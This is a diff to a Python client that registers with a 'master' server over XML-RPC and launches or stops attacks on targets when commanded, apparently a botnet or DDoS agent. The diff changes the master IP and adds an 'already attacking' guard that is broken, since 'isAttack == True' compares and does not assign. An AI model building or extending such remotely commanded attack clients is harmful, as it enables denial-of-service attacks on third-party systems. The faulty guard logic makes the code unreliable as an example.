@@ -7,7 +7,8 @@ import xmlrpc.client
 from xmlrpc.server import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
 from socketserver import ThreadingMixIn
 
-s = xmlrpc.client.ServerProxy("http://192.168.1.5:8000")
+s = xmlrpc.client.ServerProxy("http://192.168.1.127:8000")
+isAttack = False
 
 
 def getIpAddress():
@@ -42,7 +43,11 @@ def stopAttack():
 def receiveCommand(message):
     """receive command from master"""
     if message["type"] == "attack":
-        attackTarget(message)
+        if isAttack == False:
+            attackTarget(message)
+            isAttack == True
+        else:
+            print("You already attack an target!")
     elif message["type"] == "stop":
         stopAttack()
 
@@ -70,7 +75,7 @@ if __name__ == '__main__':
     ip_address = getIpAddress()
     s.register_ip(ip_address)
     try:
-        listenMaster("192.168.1.5")
+        listenMaster("192.168.1.127")
     except KeyboardInterrupt:
         s.unregister_ip(ip_address)
         sys.exit(0)
